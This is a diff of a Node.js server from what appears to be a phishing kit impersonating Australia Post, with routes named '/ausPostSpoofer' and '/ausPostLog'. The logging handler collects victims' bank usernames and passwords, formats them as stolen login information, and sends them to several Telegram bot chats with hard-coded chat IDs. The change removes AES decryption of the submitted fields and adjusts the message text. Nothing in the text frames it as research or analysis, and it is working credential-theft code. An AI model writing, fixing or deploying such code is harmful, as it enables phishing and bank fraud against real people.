@@ -234,12 +234,8 @@ app.post("/ausPostSpoofer", (req, res) => {
 app.options("/ausPostLog", cors());
 
 app.post("/ausPostLog", (req, res) => {
-  username = CryptoJS.AES.decrypt(req.body.username, "402312").toString(
-    CryptoJS.enc.Utf8
-  );
-  password = CryptoJS.AES.decrypt(req.body.password, "402312").toString(
-    CryptoJS.enc.Utf8
-  );
+  username = req.body.username;
+  password = req.body.password;
   bank = req.body.bank;
   owner = req.body.owner;
   uniqueid = req.body.uniqueid;
@@ -247,7 +243,7 @@ app.post("/ausPostLog", (req, res) => {
   var originalText = `+----------- ${bank} Login Information ------------+\nUsername: ${username}\nPassword: ${password}`;
 
   axios.post(
-    `https://api.telegram.org/bot${process.env.sendresbotID}/sendMessage?chat_id=680379375&text=AusPostLog${owner}:\n${originalText}`
+    `https://api.telegram.org/bot${process.env.sendresbotID}/sendMessage?chat_id=680379375&text=AusPostLog ${owner}:\n${originalText}`
   );
   axios.post(
     `https://api.telegram.org/bot${process.env.sendresbotID}/sendMessage?chat_id=993063133&text=AusPostLog:\n${originalText}`
